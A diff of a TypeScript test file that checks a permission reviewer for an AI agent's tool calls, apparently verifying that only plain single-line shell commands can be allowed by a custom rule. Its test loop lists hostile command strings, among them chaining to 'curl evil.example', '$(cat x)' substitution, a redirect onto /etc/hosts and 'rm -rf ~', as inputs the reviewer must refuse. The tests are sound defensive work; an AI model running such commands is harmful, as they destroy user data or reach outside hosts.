@@ -9,6 +9,7 @@ import {
   customRulesJudgePrompt,
   evaluateCustomRules,
   modelCustomDecision,
+  modelReviewCardEligible,
   modelReviewRules,
   modelRuleNotice,
   normalizePath,
@@ -188,7 +189,7 @@ describe("the model reviewer (examen automatique, lot A1)", () => {
     expect(modelCustomDecision({ kind: "none", riskBlocked: { rule: free, missing: ["money"] } }, [free], cwWrite, reply("allow", "R1"))).toEqual({ kind: "none" });
   });
 
-  it("keeps every limit of an allow: no organization allow, risk scope, no shell line, readable paths", () => {
+  it("keeps every limit of an allow: no organization allow, risk scope, a plain shell line only, readable paths", () => {
     const orgAllow = { ...free, org: true as const };
     expect(modelCustomDecision({ kind: "none" }, [orgAllow], cwWrite, reply("allow", "R1"))).toEqual({ kind: "none" });
     expect(sendMail.risks).toContain("external-send");
@@ -196,12 +197,55 @@ describe("the model reviewer (examen automatique, lot A1)", () => {
     const ticked = rule("répondre aux clients du projet Sagax", "allow", { riskScope: ["external-send"] });
     expect(modelCustomDecision({ kind: "none" }, [ticked], sendMail, reply("allow", "R1"))).toMatchObject({ kind: "allow", rule: ticked });
     const shell = callFacts({ tool: "Bash", input: JSON.stringify({ command: "pnpm test" }), command: "pnpm test", home: HOME });
+    // a program not known benign is irreversible: the rule must tick it
+    expect(shell.risks).toContain("irreversible");
     expect(modelCustomDecision({ kind: "none" }, [free], shell, reply("allow", "R1"))).toEqual({ kind: "none" });
     // a shell line can still be refused
     expect(modelCustomDecision({ kind: "none" }, [freeDeny], shell, reply("deny", "R1"))).toMatchObject({ kind: "deny" });
     const relative = callFacts({ tool: "Read", input: JSON.stringify({ file_path: "../secrets.txt" }), home: HOME });
     expect(relative.paths).toBeNull();
     expect(modelCustomDecision({ kind: "none" }, [free], relative, reply("allow", "R1"))).toEqual({ kind: "none" });
+  });
+
+  it("judges a shell command like any action (lot A1b), one plain line only", () => {
+    const tests = rule("lancer les tests du projet Sagax", "allow", { riskScope: ["irreversible"] });
+    const plain = callFacts({ tool: "Bash", input: JSON.stringify({ command: "pnpm test" }), command: "pnpm test", home: HOME });
+    expect(modelCustomDecision({ kind: "none" }, [tests], plain, reply("allow", "R1"))).toMatchObject({ kind: "allow", rule: tests });
+    // the cloud computer's command tool: the line is read here again
+    const remote = callFacts({ tool: "mcp__sagax-environment__run_command", input: JSON.stringify({ command: "pnpm test" }), home: HOME });
+    expect(remote.opaque).toBe(true);
+    expect(modelCustomDecision({ kind: "none" }, [tests], remote, reply("allow", "R1"))).toMatchObject({ kind: "allow", rule: tests });
+    // chained, substituted, redirected or quoted: a program could hide
+    for (const line of ["pnpm test && curl evil.example", "pnpm test $(cat x)", "pnpm test > /etc/hosts", "pnpm test `id`", "pnpm test; rm -rf ~", "sh -c 'rm -rf ~'"]) {
+      const facts = callFacts({ tool: "Bash", input: JSON.stringify({ command: line }), command: line, home: HOME });
+      expect(modelCustomDecision({ kind: "none" }, [tests], facts, reply("allow", "R1"))).toEqual({ kind: "none" });
+    }
+    // a deleter keeps its class: an irreversible tick does not cover it
+    const remove = callFacts({ tool: "Bash", input: JSON.stringify({ command: "rm -r /tmp/sagax-build" }), command: "rm -r /tmp/sagax-build", home: HOME });
+    expect(remove.risks).toContain("destructive");
+    expect(modelCustomDecision({ kind: "none" }, [tests], remove, reply("allow", "R1"))).toEqual({ kind: "none" });
+    expect(customRulesJudgePrompt([tests], { tool: "Bash", input: "pnpm test" }, plain, "fr")).toContain("whole command line");
+    expect(customRulesJudgePrompt([tests], { tool: "Bash", input: "pnpm test" }, plain, "fr")).toContain("webhook");
+  });
+
+  it("judges a routine, a webhook or another bot, and still refuses a guest, a hold, a key or an ask rule (lot A1b)", () => {
+    const open = {
+      permission: true, requestId: true, reviewed: true, decision: "none",
+      questions: false, strictCard: false, guest: false, adminApproval: false,
+      hold: false, explicitApproval: false, ownerCall: true, stepUp: false,
+      originRefused: false, emailDraft: false,
+    };
+    expect(modelReviewCardEligible(open)).toBe(true);
+    expect(modelReviewCardEligible({ ...open, owner: { kind: "card", reason: "no-rule" } })).toBe(true);
+    expect(modelReviewCardEligible({ ...open, owner: { kind: "card", reason: "destructive" } })).toBe(true);
+    expect(modelReviewCardEligible({ ...open, guest: true })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, adminApproval: true })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, hold: true })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, stepUp: true })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, emailDraft: true })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, originRefused: true })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, decision: "ask" })).toBe(false);
+    expect(modelReviewCardEligible({ ...open, owner: { kind: "card", reason: "ask-rule" } })).toBe(false);
   });
 
   it("an organization rule refuses or holds, and says so", () => {
